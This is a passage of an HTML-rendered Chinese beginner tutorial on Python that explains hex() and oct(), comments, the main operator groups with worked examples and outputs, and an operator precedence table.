将10进制整数转换成16进制，以字符串形式表示</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#0x14</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"oct-x\"><a href=\"#oct-x\" class=\"headerlink\" title=\"oct(x)\"></a><code>oct(x)</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 将一个整数转换成 8 进制字符串</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">oct</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#0o12</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"注释-1\"><a href=\"#注释-1\" class=\"headerlink\" title=\"注释\"></a>注释</h2><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 单行注释</span>\n\n<span class=\"token triple-quoted-string string\">'''\n多行注释\n'''</span>\n\n<span class=\"token triple-quoted-string string\">\"\"\"\n多行注释\n\"\"\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"运算符\"><a href=\"#运算符\" class=\"headerlink\" title=\"运算符\"></a>运算符</h2><h3 id=\"算数运算符\"><a href=\"#算数运算符\" class=\"headerlink\" title=\"算数运算符\"></a>算数运算符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a <span class=\"token operator\">=</span> <span class=\"token number\">4</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 7</span>\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">-</span> b\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 1</span>\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">*</span> b\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 12</span>\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">/</span> b\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 1.3333333333333333</span>\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">%</span> b\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 1</span>\na <span class=\"token operator\">=</span> <span class=\"token number\">4</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">**</span> b  <span class=\"token comment\"># 乘方</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 64</span>\na <span class=\"token operator\">=</span> <span class=\"token number\">10</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">//</span> b  <span class=\"token comment\"># 取整除</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 2</span>\n\n<span class=\"token triple-quoted-string string\">'''\nc 的值为： 7\nc 的值为： 1\nc 的值为： 12\nc 的值为： 1.3333333333333333\nc 的值为： 1\nc 的值为： 64\nc 的值为： 2\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"比较运算符\"><a href=\"#比较运算符\" class=\"headerlink\" title=\"比较运算符\"></a>比较运算符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a <span class=\"token operator\">=</span> <span class=\"token number\">21</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">10</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">==</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 等于 b\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 不等于 b\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># a 不等于 b</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">!=</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 不等于 b\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 等于 b\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># a 不等于 b</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 小于 b\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 大于等于 b\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># a 大于等于 b</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">&gt;</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 大于 b\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 小于等于 b\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># a 大于 b</span>\n<span class=\"token comment\"># 修改变量 a 和 b 的值</span>\na <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">20</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">&lt;=</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 小于等于 b\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 大于  b\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># a 小于等于 b</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">&gt;=</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b 大于等于 a\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b 小于 a\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># b 大于等于 a    </span>\n<span class=\"token triple-quoted-string string\">'''\na 不等于 b\na 不等于 b\na 大于等于 b\na 大于 b\na 小于等于 b\nb 大于等于 a\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"赋值运算符\"><a href=\"#赋值运算符\" class=\"headerlink\" title=\"赋值运算符\"></a>赋值运算符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a <span class=\"token operator\">=</span> <span class=\"token number\">21</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">10</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 31</span>\nc <span class=\"token operator\">+=</span> a\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 52</span>\nc <span class=\"token operator\">*=</span> a\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 1092</span>\nc <span class=\"token operator\">/=</span> a\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 52.0</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nc <span class=\"token operator\">%=</span> a\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 2</span>\nc <span class=\"token operator\">**=</span> a\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 2097152</span>\nc <span class=\"token operator\">//=</span> a\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 99864</span>\n<span class=\"token triple-quoted-string string\">'''\nc 的值为： 31\nc 的值为： 52\nc 的值为： 1092\nc 的值为： 52.0\nc 的值为： 2\nc 的值为： 2097152\nc 的值为： 99864\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"位运算符\"><a href=\"#位运算符\" class=\"headerlink\" title=\"位运算符\"></a>位运算符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a <span class=\"token operator\">=</span> <span class=\"token number\">60</span>  <span class=\"token comment\"># 60 = 0011 1100</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">13</span>  <span class=\"token comment\"># 13 = 0000 1101</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">&amp;</span> b  <span class=\"token comment\"># 12 = 0000 1100</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 12</span>\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">|</span> b  <span class=\"token comment\"># 61 = 0011 1101</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 61</span>\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">^</span> b  <span class=\"token comment\"># 49 = 0011 0001</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 49</span>\nc <span class=\"token operator\">=</span> <span class=\"token operator\">~</span>a  <span class=\"token comment\"># -61 = 1100 0011</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># -61</span>\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span>  <span class=\"token comment\"># 240 = 1111 0000</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 240</span>\nc <span class=\"token operator\">=</span> a <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">2</span>  <span class=\"token comment\"># 15 = 0000 1111</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c 的值为：\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 15</span>\n<span class=\"token triple-quoted-string string\">'''\nc 的值为： 12\nc 的值为： 61\nc 的值为： 49\nc 的值为： -61\nc 的值为： 240\nc 的值为： 15\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"逻辑运算符\"><a href=\"#逻辑运算符\" class=\"headerlink\" title=\"逻辑运算符\"></a>逻辑运算符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a <span class=\"token operator\">=</span> <span class=\"token number\">10</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">20</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token keyword\">and</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 和 b 都为 true\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 和 b 有一个不为 true\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 变量 a 和 b 都为 true</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token keyword\">or</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 和 b 都为 true，或其中一个变量为 true\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 和 b 都不为 true\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 变量 a 和 b 都为 true，或其中一个变量为 true</span>\n<span class=\"token comment\"># 修改变量 a 的值</span>\na <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token keyword\">and</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 和 b 都为 true\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 和 b 有一个不为 true\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 变量 a 和 b 有一个不为 true</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token keyword\">or</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 和 b 都为 true，或其中一个变量为 true\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 和 b 都不为 true\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 变量 a 和 b 都为 true，或其中一个变量为 true</span>\n<span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token punctuation\">(</span>a <span class=\"token keyword\">and</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 和 b 都为 false，或其中一个变量为 false\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 和 b 都为 true\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 变量 a 和 b 都为 false，或其中一个变量为 false    </span>\n<span class=\"token triple-quoted-string string\">'''\n变量 a 和 b 都为 true\n变量 a 和 b 都为 true，或其中一个变量为 true\n变量 a 和 b 有一个不为 true\n变量 a 和 b 都为 true，或其中一个变量为 true\n变量 a 和 b 都为 false，或其中一个变量为 false\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"成员运算符\"><a href=\"#成员运算符\" class=\"headerlink\" title=\"成员运算符\"></a>成员运算符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a <span class=\"token operator\">=</span> <span class=\"token number\">10</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">20</span>\n<span class=\"token builtin\">list</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token keyword\">in</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 在给定的列表中 list 中\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 不在给定的列表中 list 中\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 变量 a 不在给定的列表中 list 中</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 b 不在给定的列表中 list 中\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 b 在给定的列表中 list 中\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 变量 b 不在给定的列表中 list 中</span>\n<span class=\"token comment\"># 修改变量 a 的值</span>\na <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token keyword\">in</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 在给定的列表中 list 中\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"变量 a 不在给定的列表中 list 中\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 变量 a 在给定的列表中 list 中</span>\n<span class=\"token triple-quoted-string string\">'''\n变量 a 不在给定的列表中 list 中\n变量 b 不在给定的列表中 list 中\n变量 a 在给定的列表中 list 中\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"身份运算符\"><a href=\"#身份运算符\" class=\"headerlink\" title=\"身份运算符\"></a>身份运算符</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a <span class=\"token operator\">=</span> <span class=\"token number\">20</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">20</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token keyword\">is</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 和 b 有相同的标识\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 和 b 没有相同的标识\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># a 和 b 有相同的标识</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">id</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 和 b 有相同的标识\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 和 b 没有相同的标识\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># a 和 b 有相同的标识</span>\n<span class=\"token comment\"># 修改变量 b 的值</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">30</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token keyword\">is</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 和 b 有相同的标识\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 和 b 没有相同的标识\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># a 和 b 没有相同的标识</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 和 b 没有相同的标识\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a 和 b 有相同的标识\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># a 和 b 没有相同的标识    </span>\n<span class=\"token triple-quoted-string string\">'''\na 和 b 有相同的标识\na 和 b 有相同的标识\na 和 b 没有相同的标识\na 和 b 没有相同的标识\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"优先级\"><a href=\"#优先级\" class=\"headerlink\" title=\"优先级\"></a>优先级</h3><table>\n<thead>\n<tr>\n<th align=\"left\">运算符</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">**</td>\n<td align=\"left\">指数 (最高优先级)</td>\n</tr>\n<tr>\n<td align=\"left\">~ + -</td>\n<td align=\"left\">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td>\n</tr>\n<tr>\n<td align=\"left\">* / % //</td>\n<td align=\"left\">乘，除，求余数和取整除</td>\n</tr>\n<tr>\n<td align=\"left\">+ -</td>\n<td align=\"left\">加法减法</td>\n</tr>\n<tr>\n<td align=\"left\">&gt;&gt; &lt;&lt;</td>\n<td align=\"left\">右移，左移运算符</td>\n</tr>\n<tr>\n<td align=\"left\">&amp;</td>\n<td align=\"left\">位 ‘AND’</td>\n</tr>\n<tr>\n<td align=\"left\">^ |</td>\n<td align=\"left\">位运算符</td>\n</tr>\n<tr>\n<td align=\"left\">&lt;= &lt; &gt; &gt;=</td>\n<td align=\"left\">比较运算符</td>\n</tr>\n<tr>\n<td align=\"left\">== !=</td>\n<td align=\"left\">等于运算符</td>\n</tr>\n<tr>\n<td align=\"left\">= %= /= //= -= += *= **=</td>\n<td align=\"left\">赋值运算符</td>\n</tr>\n<tr>\n<td align=\"left\">is is not</td>\n<td align=\"left\">身份运算符</td>\n</tr>\n<tr>\n<td align=\"left\">in not in</td>\n<td align=\"left\">成员运算符</td>\n</tr>\n<tr>\n<td align=\"left\">not and or</td>\n<td align=\"left\">逻辑运算符</td>\n</tr>\n</tbody></table>\n<h2 id=\"数字-Number\"><a href=\"#数字-Number\" class=\"headerlink\" title=\"数字(Number)\"></a>数字(Number)</h2><p>直接创建，不用特别定义类型</p>\n<p>支持int、float、bool、complex（复数）</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">var <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\nvar1 <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">,</span> var1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 1 test</span>\n<span class=\"token keyword\">del</span> var<span class=\"token punctuation\">,</span> var1 <span class=\"token comment\"># 删除对象</span>\n<span class=\"token comment\"># 8或者16进制表示数字</span>\nvar <span class=\"token operator\">=</span> <span class=\"token number\">0x99</span>\nvar1 <span class=\"token operator\">=</span> <span class=\"token number\">0o43</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>var<span class=\"token punctuation\">,</span> var1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 153 35</span><span aria-hidden=\"true\" 